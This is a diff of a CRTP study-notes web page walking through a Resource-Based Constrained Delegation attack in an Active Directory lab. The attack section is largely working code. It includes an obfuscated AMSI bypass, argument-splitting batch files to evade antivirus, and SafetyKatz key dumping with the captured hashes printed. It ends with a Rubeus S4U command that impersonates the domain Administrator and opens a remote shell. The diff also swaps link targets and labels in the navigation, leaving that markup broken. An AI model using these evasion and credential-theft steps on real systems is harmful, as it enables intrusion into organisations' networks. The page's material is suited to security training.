@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>RBCD - CRTP</title>
+  <title>Resource-Based Constrained Delegation (RBCD) - CRTP</title>
   <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -76,25 +76,25 @@
           <a href="../../" class="home-link">← Home</a>
           <a href="../../certifications/" class="home-link">← Certifications</a>
           <h3>Sections</h3>
-          <a href="enumeration.html" class="">Enumeration</a>
-          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
-          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
-          <a href="golden-ticket.html" class="">Golden Ticket</a>
-          <a href="silver-ticket.html" class="">Silver Ticket</a>
-          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
-          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
-          <a href="dcsync-attack.html" class="">DCSync Attack</a>
-          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
-          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
-          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
-          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
-          <a href="rbcd.html" class="active">RBCD</a>
-          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
-          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
-          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
-          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
-          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
-          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+          <a href="Enumeration" class="">enumeration.html</a>
+          <a href="Privilege Escalation" class="">privilege-escalation.html</a>
+          <a href="Privilege Escalation via Domain Admin session" class="">privilege-escalation-domain-admin.html</a>
+          <a href="Golden Ticket" class="">golden-ticket.html</a>
+          <a href="Silver Ticket" class="">silver-ticket.html</a>
+          <a href="Diamond Ticket" class="">diamond-ticket.html</a>
+          <a href="Abusing DSRM Credentials" class="">abusing-dsrm-credentials.html</a>
+          <a href="DCSync Attack" class="">dcsync-attack.html</a>
+          <a href="Security Descriptor Abuse" class="">security-descriptor-abuse.html</a>
+          <a href="ASREP-Roasting Attack" class="">asrep-roasting.html</a>
+          <a href="Unconstrained Delegation" class="">unconstrained-delegation.html</a>
+          <a href="Constrained Delegation" class="">constrained-delegation.html</a>
+          <a href="Resource-Based Constrained Delegation (RBCD)" class="">rbcd.html</a>
+          <a href="Enterprise Admins Trust - SID-History Abuse with Trust Ticket" class="">sid-history-trust-ticket.html</a>
+          <a href="Enterprise Admin Trust - SID-History Abuse with KRBTGT hash" class="">sid-history-krbtgt.html</a>
+          <a href="CrossForest Trust - Trust Flow" class="">cross-forest-trust.html</a>
+          <a href="ADCS Attacks" class="">adcs-attacks.html</a>
+          <a href="Trust Links Abuse" class="">trust-links-abuse.html</a>
+          <a href="MDE/MDI Bypass" class="">mde-mdi-bypass.html</a>
 
         </div>
         <div class="separator"></div>
@@ -114,112 +114,46 @@
 
     <div class="main-content">
       <article class="about active" data-page="about">
-        <header class="h2 article-title">RBCD</header>
+        <header class="h2 article-title">Resource-Based Constrained Delegation (RBCD)</header>
         <section class="about-text">
           <div class="notion-content">
-<h3>Resource-Based Constrained Delegation (RBCD)</h3>
-<p>Resource-Based Constrained Delegation (RBCD) is a feature in Windows Server 2012 that allows resources to configure which accounts are trusted to delegate to them. This is different from classic constrained delegation, which is configured on the account itself.</p>
-<h3>Key Features</h3>
-<ol>
-<li>
-<p>msDS-AllowedToActOnBehalfOfOtherIdentity Attribute: RBCD uses this attribute to store a security descriptor for the object that can access the resource. This attribute controls resource-based delegation.</p>
-</li>
-<li>
-<p>Security: RBCD is considered more secure than classic constrained delegation because it provides authentication support for across-domain service solutions using an existing Kerberos infrastructure without the need for unconstrained delegation.</p>
-</li>
-</ol>
-<h3>Abuse Scenarios</h3>
-<ol>
-<li>
-<p>Creating a Computer Object: An attacker can create a new computer account using PowerMad, which is allowed due to the default MachineAccountQuota value. This allows them to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to contain a security descriptor with the computer account they control.</p>
-</li>
-<li>
-<p>Write Permissions: The attacker needs write permission over the target computer to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.</p>
-</li>
-<li>
-<p>SPN Configuration: The attacker needs control over an object that has SPN configured or the ability to add a new machine account to the domain.</p>
-</li>
-</ol>
-<h3>Comparison with Constrained Delegation</h3>
-<ol>
-<li>
-<p>Configuration: Constrained delegation is configured on the account itself, while RBCD is configured on the resource or computer account.</p>
-</li>
-<li>
-<p>msDS-AllowedToDelegateTo and msDS-AllowedToActOnBehalfOfOtherIdentity Attributes: Constrained delegation uses msDS-AllowedToDelegateTo to store a list of target services that a service configured for delegation can access as another user. RBCD uses msDS-AllowedToActOnBehalfOfOtherIdentity to store a list of services that can access a target service as another user.</p>
-</li>
-<li>
-<p>Security: RBCD is considered more secure than classic constrained delegation because it provides authentication support for across-domain service solutions using an existing Kerberos infrastructure without the need for unconstrained delegation.</p>
-</li>
-</ol>
-<h1>Enumerating RBCD</h1>
-<p>Let's use PowerView from a PowerShell session to enumerate <code>Write</code> permissions for a user that we have compromised.
-<code>SAM Username: ciadminHash NTLM: e08253add90dccf1a208523d02998c3daes256_hmac:1bbe86f1b5285109dd1450b55ed8851c220b81cc187f9af64e4048ed25083879</code></p>
-<p>Assuming that we do have AV enabled on the machine or network, let’s run InvisiShell to bypass script blocking mechanisms and bypass AMSI as well.</p>
-<p><code>RunWithRegistryNonAdmin.bat</code></p>
-<p>AMSI Bypass</p>
-<div class="highlight"><pre><span></span><code><span class="n">S</span><span class="p">`</span><span class="n">eT-It</span><span class="p">`</span><span class="n">em</span> <span class="p">(</span> <span class="s1">&#39;V&#39;</span><span class="p">+</span><span class="s1">&#39;aR&#39;</span> <span class="p">+</span> <span class="s1">&#39;IA&#39;</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;blE:1&#39;</span><span class="p">+</span><span class="s1">&#39;q2&#39;</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;uZ&#39;</span><span class="p">+</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">(</span><span class="no">[TYpE]</span><span class="p">(</span> <span class="s2">&quot;{1}{0}&quot;</span><span class="o">-F</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;rE&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">;</span> <span class="p">(</span> <span class="nb">Get-varI</span><span class="p">`</span><span class="n">A</span><span class="p">`</span><span class="n">BLE</span> <span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="p">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span> <span class="p">+</span><span class="s1">&#39;zX&#39;</span> <span class="p">)</span> <span class="n">-VaL</span> <span class="p">).</span><span class="s2">&quot;A`ss`Embly&quot;</span><span class="p">.</span><span class="s2">&quot;GET</span><span class="se">`T</span><span class="s2">Y`Pe&quot;</span><span class="p">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;Uti&#39;</span><span class="p">+</span><span class="s1">&#39;l&#39;</span><span class="p">),</span><span class="s1">&#39;A&#39;</span><span class="p">,(</span><span class="s1">&#39;Am&#39;</span><span class="p">+</span><span class="s1">&#39;si&#39;</span><span class="p">),(</span><span class="s1">&#39;.Man&#39;</span><span class="p">+</span><span class="s1">&#39;age&#39;</span><span class="p">+</span><span class="s1">&#39;men&#39;</span><span class="p">+</span><span class="s1">&#39;t.&#39;</span><span class="p">),(</span><span class="s1">&#39;u&#39;</span><span class="p">+</span><span class="s1">&#39;to&#39;</span><span class="p">+</span><span class="s1">&#39;mation.&#39;</span><span class="p">),</span><span class="s1">&#39;s&#39;</span><span class="p">,(</span><span class="s1">&#39;Syst&#39;</span><span class="p">+</span><span class="s1">&#39;em&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">).</span><span class="s2">&quot;g`etf`iElD&quot;</span><span class="p">(</span> <span class="p">(</span> <span class="s2">&quot;{0}{2}{1}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="p">+</span><span class="s1">&#39;nitF&#39;</span><span class="p">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span> <span class="p">),(</span> <span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="p">+</span><span class="s1">&#39;Publ&#39;</span><span class="p">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span> <span class="p">)).</span><span class="s2">&quot;sE</span><span class="se">`T`V</span><span class="s2">aLUE&quot;</span><span class="p">(${</span><span class="n">n</span><span class="p">`</span><span class="n">ULl</span><span class="p">},${</span><span class="n">t</span><span class="p">`</span><span class="n">RuE</span><span class="p">}</span> <span class="p">)</span>
-</code></pre></div>
-
-<p>We can enumerate this via BloodHound or using PowerView.
-I will focus this enumeration via PowerView since my focus in on one specific user to far.</p>
-<p>Assuming that I already have compromised a list of users and its secrets(credentials), after enumerating one by one I was able to find some interesting information from user <code>CIADMIN</code>.</p>
-<p>Since I already have a session as ciadmin I will start enumerating as ciadmin.</p>
-<p><code>. .\PowerView.ps1</code></p>
-<p><code>Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}</code></p>
-<p>The output from <code>Find-InterestingDomainACL</code> indicates that <code>ciadmin</code> has GenericWrite rights on the machine account <code>DCORP-MGMT</code>, which can be used to abuse RBCD.</p>
-<p>OK, now let’s set RBCD on dcorp-mgmt for our own machine. We will do it using PowerView module.</p>
-<p><code>. .\PowerView.ps1</code></p>
-<p><code>Set-DomainRBCD -identity dcorp-mgmt -DelegateFrom 'DCORP-STD451$' -Verbose</code></p>
-<p>Let’s now confirm that RBCD was properly configured from our previous <code>Set-DomainRBCD</code> command</p>
-<p><code>Get-DomainRBCD</code></p>
-<p>The output indicates that the RBCD configuration for <code>DCORP-MGMT$</code> has been set to delegate access to <code>DCORP-STD451$</code>. This means that <code>DCORP-MGMT$</code> can act on behalf of <code>DCORP-STD451$</code> in the context of Kerberos authentication.</p>
-<p>We can get our own AES keys because we configure our machine for it using SafetyKatz.</p>
-<h3>Using PELoader.exe for args encoding.</h3>
-<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
-<p>ArgSpli.bat</p>
-<p><code>sekurlsa:ekeys</code></p>
-<div class="highlight"><pre><span></span><code><span class="nb">set </span><span class="s2">&quot;z=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;y=y&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;x=e&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;w=k&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;v=e&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;u=:&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;t=:&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;s=a&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;r=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;q=l&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;p=r&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;o=u&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;n=k&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;m=e&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;l=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</span>
-</code></pre></div>
-
-<p>Now we execute SafetyKatz to get the all AES Keys.</p>
-<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn%" "exit”</code></p>
-<div class="highlight"><pre><span></span><code><span class="n">Username</span> <span class="p">:</span> <span class="n">dcorp-std451</span><span class="p">$</span>
-<span class="n">Domain</span>   <span class="p">:</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-<span class="n">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
-<span class="n">aes256_hmac</span><span class="p">:</span><span class="n">73a9a0be0edcfe618992946c2639cafaf2003a6d6e94ca0c79eb59c4b17d3409</span>
-</code></pre></div>
-
-<p>Now let’s use Rubeus to abuse this RBCD and access <strong>DCORP-MGMT</strong> as Domain Administrator “<code>Administrator</code>”.</p>
-<p>ArgSplit.bat</p>
-<p><code>s4u</code></p>
-<div class="highlight"><pre><span></span><code><span class="nb">set </span><span class="s2">&quot;z=u&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;y=4&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;x=2&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;Pwn=%x%%y%%z%&quot;</span>
-</code></pre></div>
-
-<p>Now we execute Rubeus to access DCORP-MGMT machine as Administrator(Domain Admin)</p>
-<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:DCORP-STD451$ /aes256:73a9a0be0edcfe618992946c2639cafaf2003a6d6e94ca0c79eb59c4b17d3409 /msdsspn:HTTP/dcorp-mgmt /impersonateuser:Administrator /ptt</code></p>
-<p>We can see above that our ticket has been imported into our Cached Tickets.</p>
-<p><code>klist</code></p>
-<p>Now we can remotely access DCORP-MGMT machine with using our imported ticket.</p>
-<p><code>winrs -r:dcorp-mgmt cmd</code></p>
+<h3 class="" id="30c79e9a-d7c9-8001-b108-c3c9d8f3d249">Resource-Based Constrained Delegation (RBCD)</h3><p class="" id="30c79e9a-d7c9-80db-87dc-dfc251cc355b">Resource-Based Constrained Delegation (RBCD) is a feature in Windows Server 2012 that allows resources to configure which accounts are trusted to delegate to them. This is different from classic constrained delegation, which is configured on the account itself.</p><h3 class="" id="30c79e9a-d7c9-80f1-bc98-d1b46c375b86">Key Features</h3><ol class="numbered-list" id="30c79e9a-d7c9-8009-998e-e1f02a0128d6" start="1" type="1"><li><strong>msDS-AllowedToActOnBehalfOfOtherIdentity Attribute</strong>: RBCD uses this attribute to store a security descriptor for the object that can access the resource. This attribute controls resource-based delegation.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-805d-a6dc-feb135ca7aff" start="2" type="1"><li><strong>Security</strong>: RBCD is considered more secure than classic constrained delegation because it provides authentication support for across-domain service solutions using an existing Kerberos infrastructure without the need for unconstrained delegation.</li></ol><h3 class="" id="30c79e9a-d7c9-8064-b4ce-f9e62c6a9bb7">Abuse Scenarios</h3><ol class="numbered-list" id="30c79e9a-d7c9-80d9-8953-d8b3d92f90ce" start="1" type="1"><li><strong>Creating a Computer Object</strong>: An attacker can create a new computer account using PowerMad, which is allowed due to the default MachineAccountQuota value. <br/>This allows them to set the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute to contain a security descriptor with the computer account they control.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8012-817e-d1eb66218e41" start="2" type="1"><li><strong>Write Permissions</strong>: The attacker needs write permission over the target computer to set the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8033-b237-dcb11c84685c" start="3" type="1"><li><strong>SPN Configuration</strong>: The attacker needs control over an object that has SPN configured or the ability to add a new machine account to the domain.</li></ol><p class="" id="30c79e9a-d7c9-8040-8c64-dd948f6ac433">
+</p><h3 class="" id="30c79e9a-d7c9-8049-9089-fab96a7d501a">Comparison with Constrained Delegation</h3><ol class="numbered-list" id="30c79e9a-d7c9-800e-af5d-fb0b29ec09be" start="1" type="1"><li><strong>Configuration</strong>: Constrained delegation is configured on the account itself, while RBCD is configured on the resource or computer account.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8094-a38d-fc39fec4aed3" start="2" type="1"><li><strong>msDS-AllowedToDelegateTo and msDS-AllowedToActOnBehalfOfOtherIdentity Attributes</strong>: Constrained delegation uses <code>msDS-AllowedToDelegateTo</code> to store a list of target services that a service configured for delegation can access as another user. RBCD uses <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> to store a list of services that can access a target service as another user.</li></ol><ol class="numbered-list" id="30c79e9a-d7c9-8075-a3ad-e96111e119eb" start="3" type="1"><li><strong>Security</strong>: RBCD is considered more secure than classic constrained delegation because it provides authentication support for across-domain service solutions using an existing Kerberos infrastructure without the need for unconstrained delegation.</li></ol><p class="" id="30c79e9a-d7c9-80c9-80c8-d1b7beec4de5">
+</p><h1 class="" id="30c79e9a-d7c9-80e9-8360-ee62ed14caa1">Enumerating RBCD</h1><p class="" id="30c79e9a-d7c9-80d1-ad5f-d0828ecdf4e9">Let's use PowerView from a PowerShell session to enumerate <code><strong>Write</strong></code> permissions for a user that we have compromised.<br/><code>SAM Username: ciadmin<br/>Hash NTLM: e08253add90dccf1a208523d02998c3d<br/>aes256_hmac:1bbe86f1b5285109dd1450b55ed8851c220b81cc187f9af64e4048ed25083879 </code><br/><br/>Assuming that we do have AV enabled on the machine or network, let’s run InvisiShell to bypass script blocking mechanisms and bypass AMSI as well.</p><p class="" id="30c79e9a-d7c9-809e-9d8c-c4a82ffbc6be"><code>RunWithRegistryNonAdmin.bat</code></p><a href="../../assets/crtp/Untitled 105.png"><img src="../../assets/crtp/Untitled 105.png"/></a><p class="" id="30c79e9a-d7c9-8059-aede-e34e9be46f3e">AMSI Bypass</p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80f6-82f8-c1383f872549"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )</code></pre><p class="" id="30c79e9a-d7c9-800c-bfac-e64e34a1737e">
+</p><p class="" id="30c79e9a-d7c9-80b5-9a46-c48b968fe153">We can enumerate this via BloodHound or using PowerView.<br/>I will focus this enumeration via PowerView since my focus in on one specific user to far.</p><p class="" id="30c79e9a-d7c9-800a-99dd-e19e2aad6ffc">
+</p><p class="" id="30c79e9a-d7c9-80ed-afe8-dfd6e64322ea">Assuming that I already have compromised a list of users and its secrets(credentials), after enumerating one by one I was able to find some interesting information from user <code><strong>CIADMIN</strong></code>.</p><p class="" id="30c79e9a-d7c9-802f-bac6-e20173b8fdbc">Since I already have a session as ciadmin I will start enumerating as ciadmin.</p><p class="" id="30c79e9a-d7c9-8048-a8b8-cb73989287db"><code>. .\PowerView.ps1</code></p><p class="" id="30c79e9a-d7c9-8047-a92d-ce3d06b7f3f7"><code>Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}</code></p><a href="../../assets/crtp/Untitled 113.png"><img src="../../assets/crtp/Untitled 113.png"/></a><p class="" id="30c79e9a-d7c9-805c-9153-fa22c7101244">The output from <code>Find-InterestingDomainACL</code> indicates that <code>ciadmin</code> has GenericWrite rights on the machine account <code>DCORP-MGMT</code>, which can be used to abuse RBCD. </p><p class="" id="30c79e9a-d7c9-8063-8a98-e137d3acab56">
+</p><p class="" id="30c79e9a-d7c9-80ec-a10f-e859322bb830">OK, now let’s set RBCD on dcorp-mgmt for our own machine. We will do it using PowerView module.</p><p class="" id="30c79e9a-d7c9-8035-a332-efe24488724c"><code>. .\PowerView.ps1</code></p><p class="" id="30c79e9a-d7c9-80e9-b623-e89f62d6b2e1"><code>Set-DomainRBCD -identity dcorp-mgmt -DelegateFrom 'DCORP-STD451$' -Verbose</code></p><a href="../../assets/crtp/Untitled 114.png"><img src="../../assets/crtp/Untitled 114.png"/></a><p class="" id="30c79e9a-d7c9-80ef-9a15-e1e1ac584fb7">Let’s now confirm that RBCD was properly configured from our previous <code>Set-DomainRBCD</code> command</p><p class="" id="30c79e9a-d7c9-805c-a333-cc3b83fb76a1"><code>Get-DomainRBCD</code></p><a href="../../assets/crtp/Untitled 115.png"><img src="../../assets/crtp/Untitled 115.png"/></a><p class="" id="30c79e9a-d7c9-805a-afd9-ff66992e358c">The output indicates that the RBCD configuration for <code>DCORP-MGMT$</code> has been set to delegate access to <code>DCORP-STD451$</code>. This means that <code>DCORP-MGMT$</code> can act on behalf of <code>DCORP-STD451$</code> in the context of Kerberos authentication.</p><p class="" id="30c79e9a-d7c9-8072-a178-c52aedd74e43">
+</p><p class="" id="30c79e9a-d7c9-80b1-88f6-ee01c4663e9f">We can get our own AES keys because we configure our machine for it using SafetyKatz.</p><h3 class="" id="30c79e9a-d7c9-80c9-8728-c1ecc2df88d4">Using PELoader.exe for args encoding.</h3><p class="" id="30c79e9a-d7c9-80f2-8f68-e1c04287ee8f">Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p><p class="" id="30c79e9a-d7c9-80a9-933b-fdd6e1cc057e">
+</p><p class="" id="30c79e9a-d7c9-80d3-ba51-cf70d0ad48ed">ArgSpli.bat</p><p class="" id="30c79e9a-d7c9-802d-b22a-c3df2601e72d"><code>sekurlsa:ekeys</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-806c-adc7-e27c2db71739"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">set "z=s"
+set "y=y"
+set "x=e"
+set "w=k"
+set "v=e"
+set "u=:"
+set "t=:"
+set "s=a"
+set "r=s"
+set "q=l"
+set "p=r"
+set "o=u"
+set "n=k"
+set "m=e"
+set "l=s"
+set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-8065-87aa-f5c19c9cbea1">Now we execute SafetyKatz to get the all AES Keys.</p><p class="" id="30c79e9a-d7c9-80a2-95d9-cb5542e3ed61"><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn%" "exit”</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-80d6-b973-f3477101c283"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">
+Username : dcorp-std451$
+Domain   : DOLLARCORP.MONEYCORP.LOCAL
+Password : (null)
+aes256_hmac:73a9a0be0edcfe618992946c2639cafaf2003a6d6e94ca0c79eb59c4b17d3409</code></pre><p class="" id="30c79e9a-d7c9-8063-9ec0-eb3f9d8d5eb2">
+</p><p class="" id="30c79e9a-d7c9-805c-8c4e-e279e6a47d58">
+</p><p class="" id="30c79e9a-d7c9-807f-9119-d546115fb402">Now let’s use Rubeus to abuse this RBCD and access <strong>DCORP-MGMT</strong> as Domain Administrator “<code><strong>Administrator</strong></code>”.</p><p class="" id="30c79e9a-d7c9-80a9-a425-ca38fdb1a766">
+</p><p class="" id="30c79e9a-d7c9-8017-a652-cc465c6beef6">ArgSplit.bat</p><p class="" id="30c79e9a-d7c9-80c5-ba4e-e8751196c634"><code>s4u</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-806a-b04a-c0ea4b68db36"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">set "z=u"
+set "y=4"
+set "x=2"
+set "Pwn=%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-803b-b155-fda69eb8ce8e">Now we execute Rubeus to access DCORP-MGMT machine as Administrator(Domain Admin)</p><p class="" id="30c79e9a-d7c9-805e-88a1-f0c37be268c1"><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:DCORP-STD451$ /aes256:73a9a0be0edcfe618992946c2639cafaf2003a6d6e94ca0c79eb59c4b17d3409 /msdsspn:HTTP/dcorp-mgmt /impersonateuser:Administrator /ptt</code></p><a href="../../assets/crtp/Untitled 116.png"><img src="../../assets/crtp/Untitled 116.png"/></a><p class="" id="30c79e9a-d7c9-80b5-a477-fd196ef06637">We can see above that our ticket has been imported into our Cached Tickets.</p><p class="" id="30c79e9a-d7c9-804d-b342-d66fe89db35f"><code>klist</code></p><a href="../../assets/crtp/Untitled 117.png"><img src="../../assets/crtp/Untitled 117.png"/></a><p class="" id="30c79e9a-d7c9-8056-b705-d8e2439bc6f5">Now we can remotely access DCORP-MGMT machine with using our imported ticket.</p><p class="" id="30c79e9a-d7c9-80fb-a373-c38a5d0b1166"><code>winrs -r:dcorp-mgmt cmd</code></p><a href="../../assets/crtp/Untitled 118.png"><img src="../../assets/crtp/Untitled 118.png"/></a><p class="" id="30c79e9a-d7c9-802c-b2e9-d2f303f40ebe">
+</p><p class="" id="30c79e9a-d7c9-80d7-9d60-e549ddb1130a">
+</p><p class="" id="30c79e9a-d7c9-8059-9c91-fc78cc6097c8">
+</p><p class="" id="30c79e9a-d7c9-80bf-be92-f56d143a23fa">
+</p>
           </div>
         </section>
       </article>
